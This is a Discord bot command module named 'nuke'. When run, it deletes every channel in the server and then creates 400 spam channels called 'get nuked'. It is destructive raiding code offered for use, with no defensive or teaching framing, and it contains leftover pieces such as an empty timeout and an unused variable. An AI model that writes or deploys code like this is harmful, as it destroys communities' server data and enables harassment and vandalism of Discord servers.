module.exports = {
    name: 'nuke',
    description: "This command nukes the server",
    async execute(message, args, cmd, client, Discord) {
        console.log('Nuke Started');
        message.guild.channels.cache.forEach(channel => channel.delete());
        const times = 400;
        const ChannelWantSend = message.guild.channels.cache.find(channel => channel.name === 'get nuked');
        setTimeout(function(){ 
         }, 5000);
        for (let i = 0; i < times; i++) {
                message.guild.channels.create('get nuked', {
                    type: 'text'
                });
        }
        console.log('Nuke Phase 1')
    }
}